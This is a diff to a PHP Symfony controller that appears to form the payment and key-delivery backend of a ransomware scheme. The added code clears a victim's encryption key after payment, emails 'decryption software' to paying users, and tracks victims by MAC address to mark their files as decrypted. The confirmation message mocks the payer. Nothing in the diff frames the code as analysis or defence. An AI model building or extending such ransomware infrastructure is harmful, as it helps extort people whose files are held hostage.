@@ -5,14 +5,17 @@ namespace App\Controller\Api;
 use App\Controller\BaseController;
 use App\Entity\Transaction;
 use App\Repository\TransactionRepository;
+use App\Service\Mailer\MailerService;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\Mailer\Exception\TransportExceptionInterface;
 use Symfony\Component\Routing\Annotation\Route;
 
 class TransactionController extends BaseController
 {
     public function __construct(
         private TransactionRepository $transactionRepository,
+        private MailerService $mailer
     )
     {}
 
@@ -125,12 +128,81 @@ class TransactionController extends BaseController
 
             $transaction->setPaymentMethod(json_encode($userPaymentMethod));
             $this->transactionRepository->save($transaction, true);
+            $user->setEncryptionKey(null);
 
             return $this->json([
                 'success' => true,
                 'message' => 'Paiement effectué... Merci pour les sous-sous dans la po-poche ! ;)'
             ]);
         } catch (\Error $e) {
+            http_response_code(500);
+            return $this->json(['error' => $e->getMessage()]);
+        }
+    }
+
+    /**
+     * @Route("/api/send_decrypt_email/{id}", methods={"GET"})
+     */
+    public function sendDecryptEmail($id): Response
+    {
+        try {
+            $transaction = $this->transactionRepository->findOneBy(
+                [
+                    'id' => $id,
+                    'paymentStatus' => Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS
+                ]
+            );
+
+            if (null === $transaction) {
+                return $this->json([
+                    'error' => true,
+                    'message' => 'Cette transaction n\'existe pas ou n\'a pas été payée'
+                ]);
+            }
+
+            $user = $transaction->getUser();
+
+            $this->mailer->send(
+                'gege@dec.com',
+                $user->getEmail(),
+                'Your decryption software',
+                'emails/decrypt_email.html.twig'
+            );
+
+            return $this->json([
+                'message' => 'L\'email contenant la clé de décryptage a été envoyé à '.$user->getEmail()
+            ]);
+        } catch(\Error | TransportExceptionInterface $e) {
+            http_response_code(500);
+            return $this->json(['error' => $e->getMessage()]);
+        }
+    }
+
+    /**
+     * @Route("/decrypt_success/{macAddress}", methods={"GET"})
+     */
+    public function decryptSuccess(Request $request, $macAddress): Response
+    {
+        try {
+            $user = $this->getUserRepository()->findOneBy(['macAddress' => $macAddress]);
+
+            if (!$user) {
+                throw $this->createNotFoundException();
+            }
+
+            $transaction = $this->transactionRepository->findLastOneByUserAndStatus($user, [Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS]);
+
+            if (!$transaction) {
+                throw $this->createNotFoundException();
+            }
+
+            $transaction->setPaymentStatus(Transaction::TRANSACTION_USER_FILE_DECRYPTED);
+
+            return $this->json([
+                'success' => true,
+                'message' => 'Fichiers décryptés et transaction modifiée'
+            ]);
+        } catch(\Error $e) {
             http_response_code(500);
             return $this->json(['error' => $e->getMessage()]);
         }
